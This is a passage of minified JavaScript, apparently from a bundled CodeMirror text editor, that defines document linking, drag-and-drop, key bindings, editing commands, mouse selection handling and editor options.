s=this.first,d=this.first+this.size;i.from!=null&&i.from>s&&(s=i.from),i.to!=null&&i.to<d&&(d=i.to);var c=new $n(Nh(this,s,d),i.mode||this.modeOption,s,this.lineSep,this.direction);return i.sharedHist&&(c.history=this.history),(this.linked||(this.linked=[])).push({doc:c,sharedHist:i.sharedHist}),c.linked=[{doc:this,isParent:!0,sharedHist:i.sharedHist}],dN(c,ny(this)),c},unlinkDoc:function(i){if(i instanceof Pt&&(i=i.doc),this.linked)for(var s=0;s<this.linked.length;++s){var d=this.linked[s];if(d.doc==i){this.linked.splice(s,1),i.unlinkDoc(this),fN(ny(this));break}}if(i.history==this.history){var c=[i.id];Ki(i,function(p){return c.push(p.id)},!0),i.history=new Dc(null),i.history.done=Ps(this.history.done,c),i.history.undone=Ps(this.history.undone,c)}},iterLinkedDocs:function(i){Ki(this,i)},getMode:function(){return this.mode},getEditor:function(){return this.cm},splitLines:function(i){return this.lineSep?i.split(this.lineSep):wh(i)},lineSeparator:function(){return this.lineSep||`
`},setDirection:dn(function(i){i!="rtl"&&(i="ltr"),i!=this.direction&&(this.direction=i,this.iter(function(s){return s.order=null}),this.cm&&tN(this.cm))})}),$n.prototype.eachLine=$n.prototype.iter;var ry=0;function pN(i){var s=this;if(iy(s),!(tt(s,i)||yi(s.display,i))){Bt(i),h&&(ry=+new Date);var d=Ua(s,i,!0),c=i.dataTransfer.files;if(!(!d||s.isReadOnly()))if(c&&c.length&&window.FileReader&&window.File)for(var p=c.length,y=Array(p),w=0,S=function(){++w==p&&cn(s,function(){d=Je(s.doc,d);var re={from:d,to:d,text:s.doc.splitLines(y.filter(function(de){return de!=null}).join(s.doc.lineSeparator())),origin:"paste"};Rs(s.doc,re),z1(s.doc,Gi(Je(s.doc,d),Je(s.doc,Qi(re))))})()},D=function(re,de){if(s.options.allowDropFileTypes&&ut(s.options.allowDropFileTypes,re.type)==-1){S();return}var ge=new FileReader;ge.onerror=function(){return S()},ge.onload=function(){var ke=ge.result;if(/[\x00-\x08\x0e-\x1f]{2}/.test(ke)){S();return}y[de]=ke,S()},ge.readAsText(re)},I=0;I<c.length;I++)D(c[I],I);else{if(s.state.draggingText&&s.doc.sel.contains(d)>-1){s.state.draggingText(i),setTimeout(function(){return s.display.input.focus()},20);return}try{var W=i.dataTransfer.getData("Text");if(W){var K;if(s.state.draggingText&&!s.state.draggingText.copy&&(K=s.listSelections()),Ic(s.doc,Gi(d,d)),K)for(var ie=0;ie<K.length;++ie)Os(s.doc,"",K[ie].anchor,K[ie].head,"drag");s.replaceSelection(W,"around","paste"),s.display.input.focus()}}catch{}}}}function mN(i,s){if(h&&(!i.state.draggingText||+new Date-ry<100)){Mr(s);return}if(!(tt(i,s)||yi(i.display,s))&&(s.dataTransfer.setData("Text",i.getSelection()),s.dataTransfer.effectAllowed="copyMove",s.dataTransfer.setDragImage&&!P)){var d=J("img",null,null,"position: fixed; left: 0; top: 0;");d.src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==",C&&(d.width=d.height=1,i.display.wrapper.appendChild(d),d._top=d.offsetTop),s.dataTransfer.setDragImage(d,0,0),C&&d.parentNode.removeChild(d)}}function gN(i,s){var d=Ua(i,s);if(d){var c=document.createDocumentFragment();Qh(i,d,c),i.display.dragCursor||(i.display.dragCursor=J("div",null,"CodeMirror-cursors CodeMirror-dragcursors"),i.display.lineSpace.insertBefore(i.display.dragCursor,i.display.cursorDiv)),ye(i.display.dragCursor,c)}}function iy(i){i.display.dragCursor&&(i.display.lineSpace.removeChild(i.display.dragCursor),i.display.dragCursor=null)}function ay(i){if(document.getElementsByClassName){for(var s=document.getElementsByClassName("CodeMirror"),d=[],c=0;c<s.length;c++){var p=s[c].CodeMirror;p&&d.push(p)}d.length&&d[0].operation(function(){for(var y=0;y<d.length;y++)i(d[y])})}}var sy=!1;function xN(){sy||(yN(),sy=!0)}function yN(){var i;fe(window,"resize",function(){i==null&&(i=setTimeout(function(){i=null,ay(vN)},100))}),fe(window,"blur",function(){return ay(Ls)})}function vN(i){var s=i.display;s.cachedCharWidth=s.cachedTextHeight=s.cachedPaddingH=null,s.scrollbarsClipped=!1,i.setSize()}for(var Zi={3:"Pause",8:"Backspace",9:"Tab",13:"Enter",16:"Shift",17:"Ctrl",18:"Alt",19:"Pause",20:"CapsLock",27:"Esc",32:"Space",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"Left",38:"Up",39:"Right",40:"Down",44:"PrintScrn",45:"Insert",46:"Delete",59:";",61:"=",91:"Mod",92:"Mod",93:"Mod",106:"*",107:"=",109:"-",110:".",111:"/",145:"ScrollLock",173:"-",186:";",187:"=",188:",",189:"-",190:".",191:"/",192:"`",219:"[",220:"\\",221:"]",222:"'",224:"Mod",63232:"Up",63233:"Down",63234:"Left",63235:"Right",63272:"Delete",63273:"Home",63275:"End",63276:"PageUp",63277:"PageDown",63302:"Insert"},xo=0;xo<10;xo++)Zi[xo+48]=Zi[xo+96]=String(xo);for(var Rc=65;Rc<=90;Rc++)Zi[Rc]=String.fromCharCode(Rc);for(var yo=1;yo<=12;yo++)Zi[yo+111]=Zi[yo+63235]="F"+yo;var bi={};bi.basic={Left:"goCharLeft",Right:"goCharRight",Up:"goLineUp",Down:"goLineDown",End:"goLineEnd",Home:"goLineStartSmart",PageUp:"goPageUp",PageDown:"goPageDown",Delete:"delCharAfter",Backspace:"delCharBefore","Shift-Backspace":"delCharBefore",Tab:"defaultTab","Shift-Tab":"indentAuto",Enter:"newlineAndIndent",Insert:"toggleOverwrite",Esc:"singleSelection"},bi.pcDefault={"Ctrl-A":"selectAll","Ctrl-D":"deleteLine","Ctrl-Z":"undo","Shift-Ctrl-Z":"redo","Ctrl-Y":"redo","Ctrl-Home":"goDocStart","Ctrl-End":"goDocEnd","Ctrl-Up":"goLineUp","Ctrl-Down":"goLineDown","Ctrl-Left":"goGroupLeft","Ctrl-Right":"goGroupRight","Alt-Left":"goLineStart","Alt-Right":"goLineEnd","Ctrl-Backspace":"delGroupBefore","Ctrl-Delete":"delGroupAfter","Ctrl-S":"save","Ctrl-F":"find","Ctrl-G":"findNext","Shift-Ctrl-G":"findPrev","Shift-Ctrl-F":"replace","Shift-Ctrl-R":"replaceAll","Ctrl-[":"indentLess","Ctrl-]":"indentMore","Ctrl-U":"undoSelection","Shift-Ctrl-U":"redoSelection","Alt-U":"redoSelection",fallthrough:"basic"},bi.emacsy={"Ctrl-F":"goCharRight","Ctrl-B":"goCharLeft","Ctrl-P":"goLineUp","Ctrl-N":"goLineDown","Ctrl-A":"goLineStart","Ctrl-E":"goLineEnd","Ctrl-V":"goPageDown","Shift-Ctrl-V":"goPageUp","Ctrl-D":"delCharAfter","Ctrl-H":"delCharBefore","Alt-Backspace":"delWordBefore","Ctrl-K":"killLine","Ctrl-T":"transposeChars","Ctrl-O":"openLine"},bi.macDefault={"Cmd-A":"selectAll","Cmd-D":"deleteLine","Cmd-Z":"undo","Shift-Cmd-Z":"redo","Cmd-Y":"redo","Cmd-Home":"goDocStart","Cmd-Up":"goDocStart","Cmd-End":"goDocEnd","Cmd-Down":"goDocEnd","Alt-Left":"goGroupLeft","Alt-Right":"goGroupRight","Cmd-Left":"goLineLeft","Cmd-Right":"goLineRight","Alt-Backspace":"delGroupBefore","Ctrl-Alt-Backspace":"delGroupAfter","Alt-Delete":"delGroupAfter","Cmd-S":"save","Cmd-F":"find","Cmd-G":"findNext","Shift-Cmd-G":"findPrev","Cmd-Alt-F":"replace","Shift-Cmd-Alt-F":"replaceAll","Cmd-[":"indentLess","Cmd-]":"indentMore","Cmd-Backspace":"delWrappedLineLeft","Cmd-Delete":"delWrappedLineRight","Cmd-U":"undoSelection","Shift-Cmd-U":"redoSelection","Ctrl-Up":"goDocStart","Ctrl-Down":"goDocEnd",fallthrough:["basic","emacsy"]},bi.default=M?bi.macDefault:bi.pcDefault;function bN(i){var s=i.split(/-(?!$)/);i=s[s.length-1];for(var d,c,p,y,w=0;w<s.length-1;w++){var S=s[w];if(/^(cmd|meta|m)$/i.test(S))y=!0;else if(/^a(lt)?$/i.test(S))d=!0;else if(/^(c|ctrl|control)$/i.test(S))c=!0;else if(/^s(hift)?$/i.test(S))p=!0;else throw new Error("Unrecognized modifier name: "+S)}return d&&(i="Alt-"+i),c&&(i="Ctrl-"+i),y&&(i="Cmd-"+i),p&&(i="Shift-"+i),i}function EN(i){var s={};for(var d in i)if(i.hasOwnProperty(d)){var c=i[d];if(/^(name|fallthrough|(de|at)tach)$/.test(d))continue;if(c=="..."){delete i[d];continue}for(var p=Wn(d.split(" "),bN),y=0;y<p.length;y++){var w=void 0,S=void 0;y==p.length-1?(S=p.join(" "),w=c):(S=p.slice(0,y+1).join(" "),w="...");var D=s[S];if(!D)s[S]=w;else if(D!=w)throw new Error("Inconsistent bindings for "+S)}delete i[d]}for(var I in s)i[I]=s[I];return i}function Ms(i,s,d,c){s=Oc(s);var p=s.call?s.call(i,c):s[i];if(p===!1)return"nothing";if(p==="...")return"multi";if(p!=null&&d(p))return"handled";if(s.fallthrough){if(Object.prototype.toString.call(s.fallthrough)!="[object Array]")return Ms(i,s.fallthrough,d,c);for(var y=0;y<s.fallthrough.length;y++){var w=Ms(i,s.fallthrough[y],d,c);if(w)return w}}}function ly(i){var s=typeof i=="string"?i:Zi[i.keyCode];return s=="Ctrl"||s=="Alt"||s=="Shift"||s=="Mod"}function oy(i,s,d){var c=i;return s.altKey&&c!="Alt"&&(i="Alt-"+i),($?s.metaKey:s.ctrlKey)&&c!="Ctrl"&&(i="Ctrl-"+i),($?s.ctrlKey:s.metaKey)&&c!="Mod"&&(i="Cmd-"+i),!d&&s.shiftKey&&c!="Shift"&&(i="Shift-"+i),i}function uy(i,s){if(C&&i.keyCode==34&&i.char)return!1;var d=Zi[i.keyCode];return d==null||i.altGraphKey?!1:(i.keyCode==3&&i.code&&(d=i.code),oy(d,i,s))}function Oc(i){return typeof i=="string"?bi[i]:i}function Bs(i,s){for(var d=i.doc.sel.ranges,c=[],p=0;p<d.length;p++){for(var y=s(d[p]);c.length&&Ze(y.from,it(c).to)<=0;){var w=c.pop();if(Ze(w.from,y.from)<0){y.from=w.from;break}}c.push(y)}tr(i,function(){for(var S=c.length-1;S>=0;S--)Os(i.doc,"",c[S].from,c[S].to,"+delete");_s(i)})}function fp(i,s,d){var c=te(i.text,s+d,d);return c<0||c>i.text.length?null:c}function hp(i,s,d){var c=fp(i,s.ch,d);return c==null?null:new ve(s.line,c,d<0?"after":"before")}function pp(i,s,d,c,p){if(i){s.doc.direction=="rtl"&&(p=-p);var y=Le(d,s.doc.direction);if(y){var w=p<0?it(y):y[0],S=p<0==(w.level==1),D=S?"after":"before",I;if(w.level>0||s.doc.direction=="rtl"){var W=Ns(s,d);I=p<0?d.text.length-1:0;var K=ri(s,W,I).top;I=Ce(function(ie){return ri(s,W,ie).top==K},p<0==(w.level==1)?w.from:w.to-1,I),D=="before"&&(I=fp(d,I,1))}else I=p<0?w.to:w.from;return new ve(c,I,D)}}return new ve(c,p<0?d.text.length:0,p<0?"before":"after")}function wN(i,s,d,c){var p=Le(s,i.doc.direction);if(!p)return hp(s,d,c);d.ch>=s.text.length?(d.ch=s.text.length,d.sticky="before"):d.ch<=0&&(d.ch=0,d.sticky="after");var y=Be(p,d.ch,d.sticky),w=p[y];if(i.doc.direction=="ltr"&&w.level%2==0&&(c>0?w.to>d.ch:w.from<d.ch))return hp(s,d,c);var S=function(Ie,Oe){return fp(s,Ie instanceof ve?Ie.ch:Ie,Oe)},D,I=function(Ie){return i.options.lineWrapping?(D=D||Ns(i,s),p1(i,s,D,Ie)):{begin:0,end:s.text.length}},W=I(d.sticky=="before"?S(d,-1):d.ch);if(i.doc.direction=="rtl"||w.level==1){var K=w.level==1==c<0,ie=S(d,K?1:-1);if(ie!=null&&(K?ie<=w.to&&ie<=W.end:ie>=w.from&&ie>=W.begin)){var re=K?"before":"after";return new ve(d.line,ie,re)}}var de=function(Ie,Oe,Pe){for(var Me=function(Nt,fn){return fn?new ve(d.line,S(Nt,1),"before"):new ve(d.line,Nt,"after")};Ie>=0&&Ie<p.length;Ie+=Oe){var Qe=p[Ie],Ge=Oe>0==(Qe.level!=1),nt=Ge?Pe.begin:S(Pe.end,-1);if(Qe.from<=nt&&nt<Qe.to||(nt=Ge?Qe.from:S(Qe.to,-1),Pe.begin<=nt&&nt<Pe.end))return Me(nt,Ge)}},ge=de(y+c,c,W);if(ge)return ge;var ke=c>0?W.end:S(W.begin,-1);return ke!=null&&!(c>0&&ke==s.text.length)&&(ge=de(c>0?0:p.length-1,c,I(ke)),ge)?ge:null}var vo={selectAll:V1,singleSelection:function(i){return i.setSelection(i.getCursor("anchor"),i.getCursor("head"),nn)},killLine:function(i){return Bs(i,function(s){if(s.empty()){var d=Ye(i.doc,s.head.line).text.length;return s.head.ch==d&&s.head.line<i.lastLine()?{from:s.head,to:ve(s.head.line+1,0)}:{from:s.head,to:ve(s.head.line,d)}}else return{from:s.from(),to:s.to()}})},deleteLine:function(i){return Bs(i,function(s){return{from:ve(s.from().line,0),to:Je(i.doc,ve(s.to().line+1,0))}})},delLineLeft:function(i){return Bs(i,function(s){return{from:ve(s.from().line,0),to:s.from()}})},delWrappedLineLeft:function(i){return Bs(i,function(s){var d=i.charCoords(s.head,"div").top+5,c=i.coordsChar({left:0,top:d},"div");return{from:c,to:s.from()}})},delWrappedLineRight:function(i){return Bs(i,function(s){var d=i.charCoords(s.head,"div").top+5,c=i.coordsChar({left:i.display.lineDiv.offsetWidth+100,top:d},"div");return{from:s.from(),to:c}})},undo:function(i){return i.undo()},redo:function(i){return i.redo()},undoSelection:function(i){return i.undoSelection()},redoSelection:function(i){return i.redoSelection()},goDocStart:function(i){return i.extendSelection(ve(i.firstLine(),0))},goDocEnd:function(i){return i.extendSelection(ve(i.lastLine()))},goLineStart:function(i){return i.extendSelectionsBy(function(s){return cy(i,s.head.line)},{origin:"+move",bias:1})},goLineStartSmart:function(i){return i.extendSelectionsBy(function(s){return dy(i,s.head)},{origin:"+move",bias:1})},goLineEnd:function(i){return i.extendSelectionsBy(function(s){return kN(i,s.head.line)},{origin:"+move",bias:-1})},goLineRight:function(i){return i.extendSelectionsBy(function(s){var d=i.cursorCoords(s.head,"div").top+5;return i.coordsChar({left:i.display.lineDiv.offsetWidth+100,top:d},"div")},Hn)},goLineLeft:function(i){return i.extendSelectionsBy(function(s){var d=i.cursorCoords(s.head,"div").top+5;return i.coordsChar({left:0,top:d},"div")},Hn)},goLineLeftSmart:function(i){return i.extendSelectionsBy(function(s){var d=i.cursorCoords(s.head,"div").top+5,c=i.coordsChar({left:0,top:d},"div");return c.ch<i.getLine(c.line).search(/\S/)?dy(i,s.head):c},Hn)},goLineUp:function(i){return i.moveV(-1,"line")},goLineDown:function(i){return i.moveV(1,"line")},goPageUp:function(i){return i.moveV(-1,"page")},goPageDown:function(i){return i.moveV(1,"page")},goCharLeft:function(i){return i.moveH(-1,"char")},goCharRight:function(i){return i.moveH(1,"char")},goColumnLeft:function(i){return i.moveH(-1,"column")},goColumnRight:function(i){return i.moveH(1,"column")},goWordLeft:function(i){return i.moveH(-1,"word")},goGroupRight:function(i){return i.moveH(1,"group")},goGroupLeft:function(i){return i.moveH(-1,"group")},goWordRight:function(i){return i.moveH(1,"word")},delCharBefore:function(i){return i.deleteH(-1,"codepoint")},delCharAfter:function(i){return i.deleteH(1,"char")},delWordBefore:function(i){return i.deleteH(-1,"word")},delWordAfter:function(i){return i.deleteH(1,"word")},delGroupBefore:function(i){return i.deleteH(-1,"group")},delGroupAfter:function(i){return i.deleteH(1,"group")},indentAuto:function(i){return i.indentSelection("smart")},indentMore:function(i){return i.indentSelection("add")},indentLess:function(i){return i.indentSelection("subtract")},insertTab:function(i){return i.replaceSelection("	")},insertSoftTab:function(i){for(var s=[],d=i.listSelections(),c=i.options.tabSize,p=0;p<d.length;p++){var y=d[p].from(),w=lt(i.getLine(y.line),y.ch,c);s.push(fr(c-w%c))}i.replaceSelections(s)},defaultTab:function(i){i.somethingSelected()?i.indentSelection("add"):i.execCommand("insertTab")},transposeChars:function(i){return tr(i,function(){for(var s=i.listSelections(),d=[],c=0;c<s.length;c++)if(s[c].empty()){var p=s[c].head,y=Ye(i.doc,p.line).text;if(y){if(p.ch==y.length&&(p=new ve(p.line,p.ch-1)),p.ch>0)p=new ve(p.line,p.ch+1),i.replaceRange(y.charAt(p.ch-1)+y.charAt(p.ch-2),ve(p.line,p.ch-2),p,"+transpose");else if(p.line>i.doc.first){var w=Ye(i.doc,p.line-1).text;w&&(p=new ve(p.line,1),i.replaceRange(y.charAt(0)+i.doc.lineSeparator()+w.charAt(w.length-1),ve(p.line-1,w.length-1),p,"+transpose"))}}d.push(new yt(p,p))}i.setSelections(d)})},newlineAndIndent:function(i){return tr(i,function(){for(var s=i.listSelections(),d=s.length-1;d>=0;d--)i.replaceRange(i.doc.lineSeparator(),s[d].anchor,s[d].head,"+input");s=i.listSelections();for(var c=0;c<s.length;c++)i.indentLine(s[c].from().line,null,!0);_s(i)})},openLine:function(i){return i.replaceSelection(`
`,"start")},toggleOverwrite:function(i){return i.toggleOverwrite()}};function cy(i,s){var d=Ye(i.doc,s),c=Br(d);return c!=d&&(s=wt(c)),pp(!0,i,c,s,1)}function kN(i,s){var d=Ye(i.doc,s),c=sS(d);return c!=d&&(s=wt(c)),pp(!0,i,d,s,-1)}function dy(i,s){var d=cy(i,s.line),c=Ye(i.doc,d.line),p=Le(c,i.doc.direction);if(!p||p[0].level==0){var y=Math.max(d.ch,c.text.search(/\S/)),w=s.line==d.line&&s.ch<=y&&s.ch;return ve(d.line,w?0:y,d.sticky)}return d}function Fc(i,s,d){if(typeof s=="string"&&(s=vo[s],!s))return!1;i.display.input.ensurePolled();var c=i.display.shift,p=!1;try{i.isReadOnly()&&(i.state.suppressEdits=!0),d&&(i.display.shift=!1),p=s(i)!=Mt}finally{i.display.shift=c,i.state.suppressEdits=!1}return p}function TN(i,s,d){for(var c=0;c<i.state.keyMaps.length;c++){var p=Ms(s,i.state.keyMaps[c],d,i);if(p)return p}return i.options.extraKeys&&Ms(s,i.options.extraKeys,d,i)||Ms(s,i.options.keyMap,d,i)}var CN=new Tt;function bo(i,s,d,c){var p=i.state.keySeq;if(p){if(ly(s))return"handled";if(/\'$/.test(s)?i.state.keySeq=null:CN.set(50,function(){i.state.keySeq==p&&(i.state.keySeq=null,i.display.input.reset())}),fy(i,p+" "+s,d,c))return!0}return fy(i,s,d,c)}function fy(i,s,d,c){var p=TN(i,s,c);return p=="multi"&&(i.state.keySeq=s),p=="handled"&&un(i,"keyHandled",i,s,d),(p=="handled"||p=="multi")&&(Bt(d),Kh(i)),!!p}function hy(i,s){var d=uy(s,!0);return d?s.shiftKey&&!i.state.keySeq?bo(i,"Shift-"+d,s,function(c){return Fc(i,c,!0)})||bo(i,d,s,function(c){if(typeof c=="string"?/^go[A-Z]/.test(c):c.motion)return Fc(i,c)}):bo(i,d,s,function(c){return Fc(i,c)}):!1}function SN(i,s,d){return bo(i,"'"+d+"'",s,function(c){return Fc(i,c,!0)})}var mp=null;function py(i){var s=this;if(!(i.target&&i.target!=s.display.input.getField())&&(s.curOp.focus=xe(se(s)),!tt(s,i))){h&&m<11&&i.keyCode==27&&(i.returnValue=!1);var d=i.keyCode;s.display.shift=d==16||i.shiftKey;var c=hy(s,i);C&&(mp=c?d:null,!c&&d==88&&!qC&&(M?i.metaKey:i.ctrlKey)&&s.replaceSelection("",null,"cut")),a&&!M&&!c&&d==46&&i.shiftKey&&!i.ctrlKey&&document.execCommand&&document.execCommand("cut"),d==18&&!/\bCodeMirror-crosshair\b/.test(s.display.lineDiv.className)&&NN(s)}}function NN(i){var s=i.display.lineDiv;q(s,"CodeMirror-crosshair");function d(c){(c.keyCode==18||!c.altKey)&&(Z(s,"CodeMirror-crosshair"),gt(document,"keyup",d),gt(document,"mouseover",d))}fe(document,"keyup",d),fe(document,"mouseover",d)}function my(i){i.keyCode==16&&(this.doc.sel.shift=!1),tt(this,i)}function gy(i){var s=this;if(!(i.target&&i.target!=s.display.input.getField())&&!(yi(s.display,i)||tt(s,i)||i.ctrlKey&&!i.altKey||M&&i.metaKey)){var d=i.keyCode,c=i.charCode;if(C&&d==mp){mp=null,Bt(i);return}if(!(C&&(!i.which||i.which<10)&&hy(s,i))){var p=String.fromCharCode(c??d);p!="\b"&&(SN(s,i,p)||s.display.input.onKeyPress(i))}}}var AN=400,gp=function(i,s,d){this.time=i,this.pos=s,this.button=d};gp.prototype.compare=function(i,s,d){return this.time+AN>i&&Ze(s,this.pos)==0&&d==this.button};var Eo,wo;function DN(i,s){var d=+new Date;return wo&&wo.compare(d,i,s)?(Eo=wo=null,"triple"):Eo&&Eo.compare(d,i,s)?(wo=new gp(d,i,s),Eo=null,"double"):(Eo=new gp(d,i,s),wo=null,"single")}function xy(i){var s=this,d=s.display;if(!(tt(s,i)||d.activeTouch&&d.input.supportsTouch())){if(d.input.ensurePolled(),d.shift=i.shiftKey,yi(d,i)){x||(d.scroller.draggable=!1,setTimeout(function(){return d.scroller.draggable=!0},100));return}if(!xp(s,i)){var c=Ua(s,i),p=qi(i),y=c?DN(c,p):"single";De(s).focus(),p==1&&s.state.selectingText&&s.state.selectingText(i),!(c&&LN(s,p,c,y,i))&&(p==1?c?IN(s,c,y,i):Gl(i)==d.scroller&&Bt(i):p==2?(c&&_c(s.doc,c),setTimeout(function(){return d.input.focus()},20)):p==3&&(Y?s.display.input.onContextMenu(i):Xh(s)))}}}function LN(i,s,d,c,p){var y="Click";return c=="double"?y="Double"+y:c=="triple"&&(y="Triple"+y),y=(s==1?"Left":s==2?"Middle":"Right")+y,bo(i,oy(y,p),p,function(w){if(typeof w=="string"&&(w=vo[w]),!w)return!1;var S=!1;try{i.isReadOnly()&&(i.state.suppressEdits=!0),S=w(i,d)!=Mt}finally{i.state.suppressEdits=!1}return S})}function _N(i,s,d){var c=i.getOption("configureMouse"),p=c?c(i,s,d):{};if(p.unit==null){var y=R?d.shiftKey&&d.metaKey:d.altKey;p.unit=y?"rectangle":s=="single"?"char":s=="double"?"word":"line"}return(p.extend==null||i.doc.extend)&&(p.extend=i.doc.extend||d.shiftKey),p.addNew==null&&(p.addNew=M?d.metaKey:d.ctrlKey),p.moveOnDrag==null&&(p.moveOnDrag=!(M?d.altKey:d.ctrlKey)),p}function IN(i,s,d,c){h?setTimeout(Ke(y1,i),0):i.curOp.focus=xe(se(i));var p=_N(i,d,c),y=i.doc.sel,w;i.options.dragDrop&&HC&&!i.isReadOnly()&&d=="single"&&(w=y.contains(s))>-1&&(Ze((w=y.ranges[w]).from(),s)<0||s.xRel>0)&&(Ze(w.to(),s)>0||s.xRel<0)?PN(i,c,s,p):jN(i,c,s,p)}function PN(i,s,d,c){var p=i.display,y=!1,w=cn(i,function(I){x&&(p.scroller.draggable=!1),i.state.draggingText=!1,i.state.delayingBlurEvent&&(i.hasFocus()?i.state.delayingBlurEvent=!1:Xh(i)),gt(p.wrapper.ownerDocument,"mouseup",w),gt(p.wrapper.ownerDocument,"mousemove",S),gt(p.scroller,"dragstart",D),gt(p.scroller,"drop",w),y||(Bt(I),c.addNew||_c(i.doc,d,null,null,c.extend),x&&!P||h&&m==9?setTimeout(function(){p.wrapper.ownerDocument.body.focus({preventScroll:!0}),p.input.focus()},20):p.input.focus())}),S=function(I){y=y||Math.abs(s.clientX-I.clientX)+Math.abs(s.clientY-I.clientY)>=10},D=function(){return y=!0};x&&(p.scroller.draggable=!0),i.state.draggingText=w,w.copy=!c.moveOnDrag,fe(p.wrapper.ownerDocument,"mouseup",w),fe(p.wrapper.ownerDocument,"mousemove",S),fe(p.scroller,"dragstart",D),fe(p.scroller,"drop",w),i.state.delayingBlurEvent=!0,setTimeout(function(){return p.input.focus()},20),p.scroller.dragDrop&&p.scroller.dragDrop()}function yy(i,s,d){if(d=="char")return new yt(s,s);if(d=="word")return i.findWordAt(s);if(d=="line")return new yt(ve(s.line,0),Je(i.doc,ve(s.line+1,0)));var c=d(i,s);return new yt(c.from,c.to)}function jN(i,s,d,c){h&&Xh(i);var p=i.display,y=i.doc;Bt(s);var w,S,D=y.sel,I=D.ranges;if(c.addNew&&!c.extend?(S=y.sel.contains(d),S>-1?w=I[S]:w=new yt(d,d)):(w=y.sel.primary(),S=y.sel.primIndex),c.unit=="rectangle")c.addNew||(w=new yt(d,d)),d=Ua(i,s,!0,!0),S=-1;else{var W=yy(i,d,c.unit);c.extend?w=cp(w,W.anchor,W.head,c.extend):w=W}c.addNew?S==-1?(S=I.length,Cn(y,Ur(i,I.concat([w]),S),{scroll:!1,origin:"*mouse"})):I.length>1&&I[S].empty()&&c.unit=="char"&&!c.extend?(Cn(y,Ur(i,I.slice(0,S).concat(I.slice(S+1)),0),{scroll:!1,origin:"*mouse"}),D=y.sel):dp(y,S,w,$e):(S=0,Cn(y,new hr([w],0),$e),D=y.sel);var K=d;function ie(Pe){if(Ze(K,Pe)!=0)if(K=Pe,c.unit=="rectangle"){for(var Me=[],Qe=i.options.tabSize,Ge=lt(Ye(y,d.line).text,d.ch,Qe),nt=lt(Ye(y,Pe.line).text,Pe.ch,Qe),Nt=Math.min(Ge,nt),fn=Math.max(Ge,nt),Ht=Math.min(d.line,Pe.line),nr=Math.min(i.lastLine(),Math.max(d.line,Pe.line));Ht<=nr;Ht++){var Yn=Ye(y,Ht).text,Zt=Un(Yn,Nt,Qe);Nt==fn?Me.push(new yt(ve(Ht,Zt),ve(Ht,Zt))):Yn.length>Zt&&Me.push(new yt(ve(Ht,Zt),ve(Ht,Un(Yn,fn,Qe))))}Me.length||Me.push(new yt(d,d)),Cn(y,Ur(i,D.ranges.slice(0,S).concat(Me),S),{origin:"*mouse",scroll:!1}),i.scrollIntoView(Pe)}else{var Vn=w,xn=yy(i,Pe,c.unit),an=Vn.anchor,Jt;Ze(xn.anchor,an)>0?(Jt=xn.head,an=dc(Vn.from(),xn.anchor)):(Jt=xn.anchor,an=cc(Vn.to(),xn.head));var qt=D.ranges.slice(0);qt[S]=RN(i,new yt(Je(y,an),Jt)),Cn(y,Ur(i,qt,S),$e)}}var re=p.wrapper.getBoundingClientRect(),de=0;function ge(Pe){var Me=++de,Qe=Ua(i,Pe,!0,c.unit=="rectangle");if(Qe)if(Ze(Qe,K)!=0){i.curOp.focus=xe(se(i)),ie(Qe);var Ge=Cc(p,y);(Qe.line>=Ge.to||Qe.line<Ge.from)&&setTimeout(cn(i,function(){de==Me&&ge(Pe)}),150)}else{var nt=Pe.clientY<re.top?-20:Pe.clientY>re.bottom?20:0;nt&&setTimeout(cn(i,function(){de==Me&&(p.scroller.scrollTop+=nt,ge(Pe))}),50)}}function ke(Pe){i.state.selectingText=!1,de=1/0,Pe&&(Bt(Pe),p.input.focus()),gt(p.wrapper.ownerDocument,"mousemove",Ie),gt(p.wrapper.ownerDocument,"mouseup",Oe),y.history.lastSelOrigin=null}var Ie=cn(i,function(Pe){Pe.buttons===0||!qi(Pe)?ke(Pe):ge(Pe)}),Oe=cn(i,ke);i.state.selectingText=Oe,fe(p.wrapper.ownerDocument,"mousemove",Ie),fe(p.wrapper.ownerDocument,"mouseup",Oe)}function RN(i,s){var d=s.anchor,c=s.head,p=Ye(i.doc,d.line);if(Ze(d,c)==0&&d.sticky==c.sticky)return s;var y=Le(p);if(!y)return s;var w=Be(y,d.ch,d.sticky),S=y[w];if(S.from!=d.ch&&S.to!=d.ch)return s;var D=w+(S.from==d.ch==(S.level!=1)?0:1);if(D==0||D==y.length)return s;var I;if(c.line!=d.line)I=(c.line-d.line)*(i.doc.direction=="ltr"?1:-1)>0;else{var W=Be(y,c.ch,c.sticky),K=W-w||(c.ch-d.ch)*(S.level==1?-1:1);W==D-1||W==D?I=K<0:I=K>0}var ie=y[D+(I?-1:0)],re=I==(ie.level==1),de=re?ie.from:ie.to,ge=re?"after":"before";return d.ch==de&&d.sticky==ge?s:new yt(new ve(d.line,de,ge),c)}function vy(i,s,d,c){var p,y;if(s.touches)p=s.touches[0].clientX,y=s.touches[0].clientY;else try{p=s.clientX,y=s.clientY}catch{return!1}if(p>=Math.floor(i.display.gutters.getBoundingClientRect().right))return!1;c&&Bt(s);var w=i.display,S=w.lineDiv.getBoundingClientRect();if(y>S.bottom||!gn(i,d))return mi(s);y-=S.top-w.viewOffset;for(var D=0;D<i.display.gutterSpecs.length;++D){var I=w.gutters.childNodes[D];if(I&&I.getBoundingClientRect().right>=p){var W=Ma(i.doc,y),K=i.display.gutterSpecs[D];return xt(i,d,i,W,K.className,s),mi(s)}}}function xp(i,s){return vy(i,s,"gutterClick",!0)}function by(i,s){yi(i.display,s)||ON(i,s)||tt(i,s,"contextmenu")||Y||i.display.input.onContextMenu(s)}function ON(i,s){return gn(i,"gutterContextMenu")?vy(i,s,"gutterContextMenu",!1):!1}function Ey(i){i.display.wrapper.className=i.display.wrapper.className.replace(/\s*cm-s-\S+/g,"")+i.options.theme.replace(/(^|\s)\s*/g," cm-s-"),to(i)}var Hs={toString:function(){return"CodeMirror.Init"}},wy={},Mc={};function FN(i){var s=i.optionHandlers;function d(c,p,y,w){i.defaults[c]=p,y&&(s[c]=w?function(S,D,I){I!=Hs&&y(S,D,I)}:y)}i.defineOption=d,i.Init=Hs,d("value","",function(c,p){return c.setValue(p)},!0),d("mode",null,function(c,p){c.doc.modeOption=p,lp(c)},!0),d("indentUnit",2,lp,!0),d("indentWithTabs",!1),d("smartIndent",!0),d("tabSize",4,function(c){uo(c),to(c),qn(c)},!0),d("lineSeparator",null,function(c,p){if(c.doc.lineSep=p,!!p){var 